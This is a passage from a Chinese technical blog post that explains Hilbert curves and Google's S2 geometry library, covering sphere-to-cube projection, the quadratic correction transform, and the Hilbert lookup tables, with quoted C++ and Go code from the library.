title="稳定"></a>稳定</h4><p>当n阶希尔伯特曲线，n趋于无穷大的时候，曲线上的点的位置基本上趋于稳定。举个例子：</p><p><img src="/assets/images/geohash-s2-30.png" alt="希尔伯特曲线与蛇形曲线对比" loading="lazy"></p><p>上图左边是希尔伯特曲线，右边是蛇形的曲线。当n趋于无穷大的时候，两者理论上都可以填满平面。但是为何希尔伯特曲线更加优秀呢？</p><p>在蛇形曲线上给定一个点，当n趋于无穷大的过程中，这个点在蛇形曲线上的位置是时刻变化的。</p><p><img src="/assets/images/geohash-s2-31.png" alt="蛇形曲线中位置点的变化性" loading="lazy"></p><p>这就造成了点的相对位置始终不定。</p><p>再看看希尔伯特曲线，同样是一个点，在n趋于无穷大的情况下：</p><p><img src="/assets/images/geohash-s2-32.png" alt="希尔伯特曲线中位置点的不变性" loading="lazy"></p><p>从上图可以看到，点的位置几乎没有怎么变化。所以希尔伯特曲线更加优秀。</p><h4 id="3-3-3、-连续"><a href="#3-3-3、-连续" class="headerlink" title="3.3.3、 连续"></a>3.3.3、 连续</h4><p><img src="/assets/images/geohash-s2-33.png" alt="im" loading="lazy"></p><p><img src="/assets/images/geohash-s2-34.png" alt="im" loading="lazy"></p><p>希尔伯特曲线是连续的，所以能保证一定可以填满空间。连续性是需要数学证明的。具体证明方法这里就不细说了，感兴趣的可以点文章末尾一篇关于希尔伯特曲线的论文，那里有连续性的证明。</p><p>接下来要介绍的谷歌的 S2 算法就是基于希尔伯特曲线的。现在读者应该明白选择希尔伯特曲线的原因了吧。</p><h2 id="四、-S2-算法"><a href="#四、-S2-算法" class="headerlink" title="四、 S2 算法"></a>四、 <a href="https://godoc.org/github.com/golang/geo/s2">S2</a> 算法</h2><blockquote><p><a href="https://code.google.com/p/s2-geometry-library/">Google’s S2 library</a> is a real treasure, not only due to its capabilities for spatial indexing but also because it is a library that was released more than 4 years ago and it didn’t get the attention it deserved</p></blockquote><p>上面这段话来自2015年一位谷歌工程师的博文。他由衷的感叹 S2 算法发布4年没有得到它应有的赞赏。不过现在 S2 已经被各大公司使用了。</p><p>在介绍这个重量级算法之前，先解释一些这个算法的名字由来。S2其实是来自几何数学中的一个数学符号 S²，它表示的是单位球。S2 这个库其实是被设计用来解决球面上各种几何问题的。值得提的一点是，除去 golang 官方 repo 里面的 geo&#x2F;s2 完成度目前只有40%，其他语言，Java，C++，Python 的 S2 实现都完成100%了。本篇文章讲解以 Go 的这个版本为主。</p><p>接下来就看看怎么用 S2 来解决多维空间点索引的问题的。</p><h3 id="4-1、-球面坐标转换"><a href="#4-1、-球面坐标转换" class="headerlink" title="4.1、 球面坐标转换"></a>4.1、 球面坐标转换</h3><p>按照之前我们处理多维空间的思路，先考虑如何降维，再考虑如何分形。</p><p>众所周知，地球是近似一个球体。球体是一个三维的，如何把三维降成一维呢？</p><p>球面上的一个点，在直角坐标系中，可以这样表示：</p><p><img src="/assets/images/geohash-s2-35.png" alt="球面一点在直角坐标系中的表示" loading="lazy"></p><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">x</span> = r * <span class="hljs-built_in">sin</span> θ * <span class="hljs-built_in">cos</span> φ<br><span class="hljs-keyword">y</span> = r * <span class="hljs-built_in">sin</span> θ * <span class="hljs-built_in">sin</span> φ <br><span class="hljs-keyword">z</span> = r * <span class="hljs-built_in">cos</span> θ<br></code></pre></td></tr></table></figure><p>通常地球上的点我们会用经纬度来表示。</p><p><img src="/assets/images/geohash-s2-36.png" alt="地球上的点使用经纬度表示" loading="lazy"></p><p>再进一步，我们可以和球面上的经纬度联系起来。不过这里需要注意的是，纬度的角度 α 和直角坐标系下的球面坐标 θ 加起来等于 90°。所以三角函数要注意转换。</p><p>于是地球上任意的一个经纬度的点，就可以转换成 f(x,y,z)。</p><p>在 S2 中，地球半径被当成单位 1 了。所以半径不用考虑。x，y，z的值域都被限定在了[-1,1] x [-1,1] x [-1,1]这个区间之内了。</p><h3 id="4-2、-球面变平面"><a href="#4-2、-球面变平面" class="headerlink" title="4.2、 球面变平面"></a>4.2、 球面变平面</h3><p>接下来一步 S2 把球面碾成平面。怎么做的呢？</p><p>首先在地球外面套了一个外切的正方体，如下图。</p><p><img src="/assets/images/geohash-s2-37.png" alt="球面外的外切正方体" loading="lazy"></p><p>从球心向外切正方体6个面分别投影。S2 是把球面上所有的点都投影到外切正方体的6个面上。</p><p><img src="/assets/images/geohash-s2-38.png" alt="投影" loading="lazy"></p><p>这里简单的画了一个投影图，上图左边的是投影到正方体一个面的示意图，实际上影响到的球面是右边那张图。</p><p><img src="/assets/images/geohash-s2-39.png" alt="头型横截面示意图" loading="lazy"></p><p>从侧面看，其中一个球面投影到正方体其中一个面上，边缘与圆心的连线相互之间的夹角为90°，但是和x，y，z轴的角度是45°。我们可以在球的6个方向上，把45°的辅助圆画出来，见下图左边。</p><p><img src="/assets/images/geohash-s2-40.png" alt="球面辅助线" loading="lazy"></p><p>上图左边的图画了6个辅助线，蓝线是前后一对，红线是左右一对，绿线是上下一对。分别都是45°的地方和圆心连线与球面相交的点的轨迹。这样我们就可以把投影到外切正方体6个面上的球面画出来，见上图右边。</p><p>投影到正方体以后，我们就可以把这个正方体展开了。</p><p><img src="/assets/images/geohash-s2-41.png" alt="球面投影展开" loading="lazy"></p><p>一个正方体的展开方式有很多种。不管怎么展开，最小单元都是一个正方形。</p><p>以上就是 S2 的投影方案。接下来讲讲其他的投影方案。</p><p>首先有下面一种方式，三角形和正方形组合。</p><p><img src="/assets/images/geohash-s2-42.png" alt="球面投影展开" loading="lazy"></p><p>这种方式展开图如下图。</p><p><img src="/assets/images/geohash-s2-43.png" alt="球面投影展开" loading="lazy"></p><p>这种方式其实很复杂，构成子图形由两种图形构成。坐标转换稍微复杂一点。</p><p>再还有一种方式是全部用三角形组成，这种方式三角形个数越多，就能越切近于球体。</p><p><img src="/assets/images/geohash-s2-44.png" alt="球面投影展开" loading="lazy"></p><p>上图最左边的图，由20个三角形构成，可以看的出来，菱角非常多，与球体相差比较大，当三角形个数越来越多，就越来越贴近球体。</p><p><img src="/assets/images/geohash-s2-45.png" alt="球面投影展开" loading="lazy"></p><p>20个三角形展开以后就可能变成这样。</p><p>最后一种方式可能是目前最好的方式，不过也可能是最复杂的方式。按照六边形来投影。</p><p><img src="/assets/images/geohash-s2-46.png" alt="球面投影展开" loading="lazy"></p><p>六边形的菱角比较少，六个边也能相互衔接其他的六边形。看上图最后边的图可以看出来，六边形足够多以后，非常近似球体。</p><p><img src="/assets/images/geohash-s2-47.png" alt="球面投影展开" loading="lazy"></p><p>六边形展开以后就是上面这样。当然这里只有12个六边形。六边形个数越多越好，粒度越细，就越贴近球体。</p><p>Uber 在一个公开分享上提到了他们用的是六边形的网格，把城市划分为很多六边形。这块应该是他们自己开发的。也许滴滴也是划分六边形，也许滴滴有更好的划分方案也说不定。</p><p>在 Google S2 中，它是把地球展开成如下的样子：</p><p><img src="/assets/images/geohash-s2-48.png" alt="球面投影展开" loading="lazy"></p><p>如果上面展开的6个面，假设都用5阶的希尔伯特曲线表示出来的话，6个面会是如下的样子：</p><p><img src="/assets/images/geohash-s2-49.png" alt="球面投影展开" loading="lazy"></p><p><img src="/assets/images/geohash-s2-50.png" alt="球面投影展开" loading="lazy"></p><p><img src="/assets/images/geohash-s2-51.png" alt="球面投影展开" loading="lazy"></p><p><img src="/assets/images/geohash-s2-52.png" alt="球面投影展开" loading="lazy"></p><p><img src="/assets/images/geohash-s2-53.png" alt="球面投影展开" loading="lazy"></p><p><img src="/assets/images/geohash-s2-54.png" alt="球面投影展开" loading="lazy"></p><p>回到 S2 上面来，S2是用的正方形。这样第一步的球面坐标进一步的被转换成 f(x,y,z) -&gt; g(face,u,v)，face是正方形的六个面，u，v对应的是六个面中的一个面上的x，y坐标。</p><h3 id="4-3、-球面矩形投影修正"><a href="#4-3、-球面矩形投影修正" class="headerlink" title="4.3、 球面矩形投影修正"></a>4.3、 球面矩形投影修正</h3><p>上一步我们把球面上的球面矩形投影到正方形的某个面上，形成的形状类似于矩形，但是由于球面上角度的不同，最终会导致即使是投影到同一个面上，每个矩形的面积也不大相同。</p><p><img src="/assets/images/geohash-s2-56.png" alt="球面矩形投影修正" loading="lazy"></p><p>上图就表示出了球面上个一个球面矩形投影到正方形一个面上的情况。</p><p><img src="/assets/images/geohash-s2-57.png" alt="球面矩形投影修正" loading="lazy"></p><p>经过实际计算发现，最大的面积和最小的面积相差5.2倍。见上图左边。相同的弧度区间，在不同的纬度上投影到正方形上的面积不同。</p><p>现在就需要修正各个投影出来形状的面积。如何选取合适的映射修正函数就成了关键。目标是能达到上图右边的样子，让各个矩形的面积尽量相同。</p><p>这块转换的代码在 C++ 的版本里面才有详细的解释，在 Go 的版本里面只一笔带过了。害笔者懵逼了好久。</p><p><img src="/assets/images/geohash-s2-58.png" alt="转换率" loading="lazy"></p><p>线性变换是最快的变换，但是变换比最小。tan() 变换可以使每个投影以后的矩形的面积更加一致，最大和最小的矩形比例仅仅只差0.414。可以说非常接近了。但是 tan() 函数的调用时间非常长。如果把所有点都按照这种方式计算的话，性能将会降低3倍。</p><p>最后谷歌选择的是二次变换，这是一个近似切线的投影曲线。它的计算速度远远快于 tan() ，大概是 tan() 计算的3倍速度。生成的投影以后的矩形大小也类似。不过最大的矩形和最小的矩形相比依旧有2.082的比率。</p><p>上表中，ToPoint 和 FromPoint 分别是把单位向量转换到 Cell ID 所需要的毫秒数、把 Cell ID 转换回单位向量所需的毫秒数（Cell ID 就是投影到正方体六个面，某个面上矩形的 ID，矩形称为 Cell，它对应的 ID 称为 Cell ID）。ToPointRaw 是某种目的下，把 Cell ID 转换为非单位向量所需的毫秒数。</p><p>在 S2 中默认的转换是二次转换。</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> S2_PROJECTION S2_QUADRATIC_PROJECTION</span><br></code></pre></td></tr></table></figure><p>详细看看这三种转换到底是怎么转换的。</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> S2_PROJECTION == S2_LINEAR_PROJECTION</span><br><br><span class="hljs-keyword">inline</span> <span class="hljs-type">double</span> <span class="hljs-title function_">S2::STtoUV</span><span class="hljs-params">(<span class="hljs-type">double</span> s)</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * s - <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">inline</span> <span class="hljs-type">double</span> <span class="hljs-title function_">S2::UVtoST</span><span class="hljs-params">(<span class="hljs-type">double</span> u)</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> * (u + <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> S2_PROJECTION == S2_TAN_PROJECTION</span><br><br><span class="hljs-keyword">inline</span> <span class="hljs-type">double</span> <span class="hljs-title function_">S2::STtoUV</span><span class="hljs-params">(<span class="hljs-type">double</span> s)</span> &#123;<br>  <span class="hljs-comment">// Unfortunately, tan(M_PI_4) is slightly less than 1.0.  This isn&#x27;t due to</span><br>  <span class="hljs-comment">// a flaw in the implementation of tan(), it&#x27;s because the derivative of</span><br>  <span class="hljs-comment">// tan(x) at x=pi/4 is 2, and it happens that the two adjacent floating</span><br>  <span class="hljs-comment">// point numbers on either side of the infinite-precision value of pi/4 have</span><br>  <span class="hljs-comment">// tangents that are slightly below and slightly above 1.0 when rounded to</span><br>  <span class="hljs-comment">// the nearest double-precision result.</span><br><br>  s = <span class="hljs-built_in">tan</span>(M_PI_2 * s - M_PI_4);<br>  <span class="hljs-keyword">return</span> s + (<span class="hljs-number">1.0</span> / (GG_LONGLONG(<span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">53</span>)) * s;<br>&#125;<br><br><span class="hljs-keyword">inline</span> <span class="hljs-type">double</span> <span class="hljs-title function_">S2::UVtoST</span><span class="hljs-params">(<span class="hljs-type">double</span> u)</span> &#123;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">double</span> a = <span class="hljs-built_in">atan</span>(u);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">2</span> * M_1_PI) * (a + M_PI_4);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> S2_PROJECTION == S2_QUADRATIC_PROJECTION</span><br><br><span class="hljs-keyword">inline</span> <span class="hljs-type">double</span> <span class="hljs-title function_">S2::STtoUV</span><span class="hljs-params">(<span class="hljs-type">double</span> s)</span> &#123;<br>  <span class="hljs-keyword">if</span> (s &gt;= <span class="hljs-number">0.5</span>) <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span>/<span class="hljs-number">3.</span>) * (<span class="hljs-number">4</span>*s*s - <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">else</span>          <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span>/<span class="hljs-number">3.</span>) * (<span class="hljs-number">1</span> - <span class="hljs-number">4</span>*(<span class="hljs-number">1</span>-s)*(<span class="hljs-number">1</span>-s));<br>&#125;<br><br><span class="hljs-keyword">inline</span> <span class="hljs-type">double</span> <span class="hljs-title function_">S2::UVtoST</span><span class="hljs-params">(<span class="hljs-type">double</span> u)</span> &#123;<br>  <span class="hljs-keyword">if</span> (u &gt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> * <span class="hljs-built_in">sqrt</span>(<span class="hljs-number">1</span> + <span class="hljs-number">3</span>*u);<br>  <span class="hljs-keyword">else</span>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> - <span class="hljs-number">0.5</span> * <span class="hljs-built_in">sqrt</span>(<span class="hljs-number">1</span> - <span class="hljs-number">3</span>*u);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">error</span> Unknown value for S2_PROJECTION</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>上面有一处对 tan(M_PI_4) 的处理，是因为精度的原因，导致略小于1.0 。</p><p>所以投影之后的修正函数三种变换应该如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 线性转换</span><br>u = <span class="hljs-number">0.5</span> * ( u + <span class="hljs-number">1</span>)<br><br><span class="hljs-comment">// tan() 变换</span><br>u = <span class="hljs-number">2</span> / pi * (<span class="hljs-built_in">atan</span>(u) + pi / <span class="hljs-number">4</span>) = <span class="hljs-number">2</span> * <span class="hljs-built_in">atan</span>(u) / pi + <span class="hljs-number">0.5</span><br><br><span class="hljs-comment">// 二次变换</span><br>u &gt;= <span class="hljs-number">0</span>，u = <span class="hljs-number">0.5</span> * <span class="hljs-built_in">sqrt</span>(<span class="hljs-number">1</span> + <span class="hljs-number">3</span>*u)<br>u &lt; <span class="hljs-number">0</span>， u = <span class="hljs-number">1</span> - <span class="hljs-number">0.5</span> * <span class="hljs-built_in">sqrt</span>(<span class="hljs-number">1</span> - <span class="hljs-number">3</span>*u)<br></code></pre></td></tr></table></figure><p>注意上面虽然变换公式只写了u，不代表只变换u。实际使用过程中，u，v都分别当做入参，都会进行变换。</p><p>这块修正函数在 Go 的版本里面就直接只实现了二次变换，其他两种变换方式找遍整个库，根本没有提及。</p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// stToUV converts an s or t value to the corresponding u or v value.</span><br><span class="hljs-comment">// This is a non-linear transformation from [-1,1] to [-1,1] that</span><br><span class="hljs-comment">// attempts to make the cell sizes more uniform.</span><br><span class="hljs-comment">// This uses what the C++ version calls &#x27;the quadratic transform&#x27;.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">stToUV</span><span class="hljs-params">(s <span class="hljs-type">float64</span>)</span></span> <span class="hljs-type">float64</span> &#123;<br><span class="hljs-keyword">if</span> s &gt;= <span class="hljs-number">0.5</span> &#123;<br><span class="hljs-keyword">return</span> (<span class="hljs-number">1</span> / <span class="hljs-number">3.</span>) * (<span class="hljs-number">4</span>*s*s - <span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-keyword">return</span> (<span class="hljs-number">1</span> / <span class="hljs-number">3.</span>) * (<span class="hljs-number">1</span> - <span class="hljs-number">4</span>*(<span class="hljs-number">1</span>-s)*(<span class="hljs-number">1</span>-s))<br>&#125;<br><br><span class="hljs-comment">// uvToST is the inverse of the stToUV transformation. Note that it</span><br><span class="hljs-comment">// is not always true that uvToST(stToUV(x)) == x due to numerical</span><br><span class="hljs-comment">// errors.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">uvToST</span><span class="hljs-params">(u <span class="hljs-type">float64</span>)</span></span> <span class="hljs-type">float64</span> &#123;<br><span class="hljs-keyword">if</span> u &gt;= <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> * math.Sqrt(<span class="hljs-number">1</span>+<span class="hljs-number">3</span>*u)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span> - <span class="hljs-number">0.5</span>*math.Sqrt(<span class="hljs-number">1</span><span class="hljs-number">-3</span>*u)<br>&#125;<br></code></pre></td></tr></table></figure><p>经过修正变换以后，u，v都变换成了s，t。值域也发生了变化。u，v的值域是[-1,1]，变换以后，是s，t的值域是[0,1]。</p><p>至此，小结一下，球面上的点S(lat,lng) -&gt; f(x,y,z) -&gt; g(face,u,v) -&gt; h(face,s,t)。目前总共转换了4步，球面经纬度坐标转换成球面xyz坐标，再转换成外切正方体投影面上的坐标，最后变换成修正后的坐标。</p><p>到目前为止，S2 可以优化的点有两处，一是投影的形状能否换成六边形？二是修正的变换函数能否找到一个效果和 tan() 类似的函数，但是计算速度远远高于 tan()，以致于不会影响计算性能？</p><h3 id="4-4、-点与坐标轴点相互转换"><a href="#4-4、-点与坐标轴点相互转换" class="headerlink" title="4.4、 点与坐标轴点相互转换"></a>4.4、 点与坐标轴点相互转换</h3><p>在 S2 算法中，默认划分 Cell 的等级是30，也就是说把一个正方形划分为 2^30 * 2^30个小的正方形。</p><p>那么上一步的s，t映射到这个正方形上面来，对应该如何转换呢？</p><p><img src="/assets/images/geohash-s2-59.png" alt="点与坐标轴点相互转换" loading="lazy"></p><p>s，t的值域是[0,1]，现在值域要扩大到[0,2^30^-1]。</p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// stToIJ converts value in ST coordinates to a value in IJ coordinates.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">stToIJ</span><span class="hljs-params">(s <span class="hljs-type">float64</span>)</span></span> <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> clamp(<span class="hljs-type">int</span>(math.Floor(maxSize*s)), <span class="hljs-number">0</span>, maxSize<span class="hljs-number">-1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>C ++ 的实现版本也一样</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">S2CellId::STtoIJ</span><span class="hljs-params">(<span class="hljs-type">double</span> s)</span> &#123;<br>  <span class="hljs-comment">// Converting from floating-point to integers via static_cast is very slow</span><br>  <span class="hljs-comment">// on Intel processors because it requires changing the rounding mode.</span><br>  <span class="hljs-comment">// Rounding to the nearest integer using FastIntRound() is much faster.</span><br>  <span class="hljs-comment">// 这里减去0.5是为了四舍五入</span><br>  <span class="hljs-keyword">return</span> max(<span class="hljs-number">0</span>, min(kMaxSize - <span class="hljs-number">1</span>, MathUtil::FastIntRound(kMaxSize * s - <span class="hljs-number">0.5</span>)));<br>&#125;<br></code></pre></td></tr></table></figure><p>到这一步，是h(face,s,t) -&gt; H(face,i,j)。</p><h3 id="4-5、-坐标轴点与希尔伯特曲线-Cell-ID-相互转换"><a href="#4-5、-坐标轴点与希尔伯特曲线-Cell-ID-相互转换" class="headerlink" title="4.5、 坐标轴点与希尔伯特曲线 Cell ID 相互转换"></a>4.5、 坐标轴点与希尔伯特曲线 Cell ID 相互转换</h3><p>最后一步，如何把 i，j 和希尔伯特曲线上的点关联起来呢？</p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>lookupBits = <span class="hljs-number">4</span><br>swapMask   = <span class="hljs-number">0x01</span><br>invertMask = <span class="hljs-number">0x02</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>ijToPos = [<span class="hljs-number">4</span>][<span class="hljs-number">4</span>]<span class="hljs-type">int</span>&#123;<br>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>&#125;, <span class="hljs-comment">// canonical order</span><br>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;, <span class="hljs-comment">// axes swapped</span><br>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;, <span class="hljs-comment">// bits inverted</span><br>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>&#125;, <span class="hljs-comment">// swapped &amp; inverted</span><br>&#125;<br>posToIJ = [<span class="hljs-number">4</span>][<span class="hljs-number">4</span>]<span class="hljs-type">int</span>&#123;<br>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>&#125;, <span class="hljs-comment">// canonical order:    (0,0), (0,1), (1,1), (1,0)</span><br>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>&#125;, <span class="hljs-comment">// axes swapped:       (0,0), (1,0), (1,1), (0,1)</span><br>&#123;<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;, <span class="hljs-comment">// bits inverted:      (1,1), (1,0), (0,0), (0,1)</span><br>&#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>&#125;, <span class="hljs-comment">// swapped &amp; inverted: (1,1), (0,1), (0,0), (1,0)</span><br>&#125;<br>posToOrientation = [<span class="hljs-number">4</span>]<span class="hljs-type">int</span>&#123;swapMask, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, invertMask | swapMask&#125;<br>lookupIJ         [<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-number">2</span>*lookupBits + <span class="hljs-number">2</span>)]<span class="hljs-type">int</span><br>lookupPos        [<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-number">2</span>*lookupBits + <span class="hljs-number">2</span>)]<span class="hljs-type">int</span><br>)<br></code></pre></td></tr></table></figure><p>在变换之前，先来解释一下定义的一些变量。</p><p>posToIJ 代表的是一个矩阵，里面记录了一些单元希尔伯特曲线的位置信息。</p><p>把 posToIJ 数组里面的信息用图表示出来，如下图：</p><p><img src="/assets/images/geohash-s2-60.png" alt="posToIJ数组信息展示" loading="lazy"></p><p>同理，把 ijToPos 数组里面的信息用图表示出来，如下图：</p><p><img src="/assets/images/geohash-s2-61.png" alt="ijToPos数组信息展示" loading="lazy"></p><p>posToOrientation 数组里面装了4个数字，分别是1,0,0,3。<br>lookupIJ 和 lookupPos 分别是两个容量为1024的数组。这里面分别对应的就是希尔伯特曲线 ID 转换成坐标轴 IJ 的转换表，和坐标轴 IJ 转换成希尔伯特曲线 ID 的转换表。</p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>initLookupCell(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>initLookupCell(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, swapMask, <span class="hljs-number">0</span>, swapMask)<br>initLookupCell(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, invertMask, <span class="hljs-number">0</span>, invertMask)<br>initLookupCell(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, swapMask|invertMask, <span class="hljs-number">0</span>, swapMask|invertMask)<br>&#125;<br></code></pre></td></tr></table></figure><p>这里是初始化的递归函数，在希尔伯特曲线的标准顺序中可以看到是有4个格子，并且格子都有顺序的，所以初始化要遍历满所有顺序。入参的第4个参数，就是从0 - 3 。</p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// initLookupCell initializes the lookupIJ table at init time.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">initLookupCell</span><span class="hljs-params">(level, i, j, origOrientation, pos, orientation <span class="hljs-type">int</span>)</span></span> &#123;<br><br><span class="hljs-keyword">if</span> level == lookupBits &#123;<br>ij := (i &lt;&lt; lookupBits) + j<br>lookupPos[(ij&lt;&lt;<span class="hljs-number">2</span>)+origOrientation] = (pos &lt;&lt; <span class="hljs-number">2</span>) + orientation<br>lookupIJ[(pos&lt;&lt;<span class="hljs-number">2</span>)+origOrientation] = (ij &lt;&lt; <span class="hljs-number">2</span>) + orientation<br><br><span class="hljs-keyword">return</span><br>&#125;<br><br>level++<br>i &lt;&lt;= <span class="hljs-number">1</span><br>j &lt;&lt;= <span class="hljs-number">1</span><br>pos &lt;&lt;= <span class="hljs-number">2</span><br><br>r := posToIJ[orientation]<br><br>initLookupCell(level, i+(r[<span class="hljs-number">0</span>]&gt;&gt;<span class="hljs-number">1</span>), j+(r[<span class="hljs-number">0</span>]&amp;<span class="hljs-number">1</span>), origOrientation, pos, orientation^posToOrientation[<span class="hljs-number">0</span>])<br>initLookupCell(level, i+(r[<span class="hljs-number">1</span>]&gt;&gt;<span class="hljs-number">1</span>), j+(r[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">1</span>), origOrientation, pos+<span class="hljs-number">1</span>, orientation^posToOrientation[<span class="hljs-number">1</span>])<br>initLookupCell(level, i+(r[<span class="hljs-number">2</span>]&gt;&gt;<span class="hljs-number">1</span>), j+(r[<span class="hljs-number">2</span>]&amp;<span class="hljs-number">1</span>), origOrientation, pos+<span class="hljs-number">2</span>, orientation^posToOrientation[<span class="hljs-number">2</span>])<br>initLookupCell(level, i+(r[<span class="hljs-number">3</span>]&gt;&gt;<span class="hljs-number">1</span>), j+(r[<span class="hljs-number">3</span>]&amp;<span class="hljs-number">1</span>), origOrientation, pos+<span class="hljs-number">3</span>, orientation^posToOrientation[<span class="hljs-number">3</span>])<br>&#125;<br></code></pre></td></tr></table></figure><p>上面这个函数是生成希尔伯特曲线的。我们可以看到有一处对<code>pos &lt;&lt; 2</code>的操作，这里是把位置变换到第一个4个小格子中，所以位置乘以了4。</p><p>由于初始设置的<code>lookupBits = 4</code>，所以i，j的变化范围是从[0,15]，总共有16<em>16&#x3D;256个，然后i，j坐标是表示的4个格子，再细分，<code>lookupBits = 4</code>这种情况下能表示的点的个数就是256</em>4&#x3D;1024个。这也正好是 lookupIJ 和 lookupPos 的总容量。</p><p>画一个局部的图，i，j从0-7变化。</p><p><img src="/assets/images/geohash-s2-62.png" alt="4阶希尔伯特曲线" loading="lazy"></p><p>上图是一个4阶希尔伯特曲线。初始化的实际过程就是初始化4阶希尔伯特上的1024个点的坐标与坐标轴上的x，y轴的对应关系表。</p><p>举个例子，下表是i，j在递归过程中产生的中间过程。下表是<br>lookupPos 表计算过程。</p><p><img src="/assets/images/geohash-s2-63.png" alt="lookupPos 表计算" loading="lazy"></p><p>取出一行详细分析一下计算过程。</p><p>假设当前(i,j)&#x3D;(0,2)，ij 的计算过程是把 i 左移4位再加上 j，整体结果再左移2位。目的是为了留出2位的方向位置。ij的前4位是i，接着4位是j，最后2位是方向。这样计算出ij的值就是8 。</p><p>接着计算lookupPos[i j]的值。从上图中可以看到(0,2)代表的单元格的4个数字是16，17，18，19 。计算到这一步，pos的值为4（pos是专门记录生成格子到第几个了，总共pos的值会循环0-255）。pos代表的是当前是第几个格子(4个小格子组成)，当前是第4个，每个格子里面有4个小格子。所以4*4就可以偏移到当前格子的第一个数字，也就是16 。posToIJ 数组里面会记录下当前格子的形状。从这里我们从中取出 orientation 。</p><p>看上图，16，17，18，19对应的是 posToIJ 数组轴旋转的情况，所以17是位于轴旋转图的数字1代表的格子中。这时 orientation &#x3D; 1 。</p><p>这样 lookupPos[i j] 表示的数字就计算出来了，4*4+1&#x3D;17 。这里就完成了i，j与希尔伯特曲线上数字的对应。</p><p>那如何由希尔伯特曲线上的数字对应到实际的坐标呢？</p><p>lookupIJ 数组里面记录了反向的信息。lookupIJ 数组 和 lookupPos 数组存储的信息正好是反向的。lookupIJ 数组 下表存的值是 lookupPos 数组 的下表。我们查 lookupIJ 数组 ，lookupIJ[17]的值就是8，对应算出来(i,j)&#x3D;(0,2)。这个时候的i，j还是大格子。还是需要借助 posToIJ 数组 里面描述的形状信息。当前形状是轴旋转，之前也知道 orientation &#x3D; 1，由于每个坐标里面有4个小格子，所以一个i，j代表的是2个小格子，所以需要乘以2，再加上形状信息里面的方向，可以计算出实际的坐标 (0 * 2 + 1 , 2 * 2 + 0) &#x3D; ( 1，4) 。</p><p>至此，整个球面坐标的坐标映射就已经完成了。</p><p>球面上的点S(lat,lng) -&gt; f(x,y,z) -&gt; 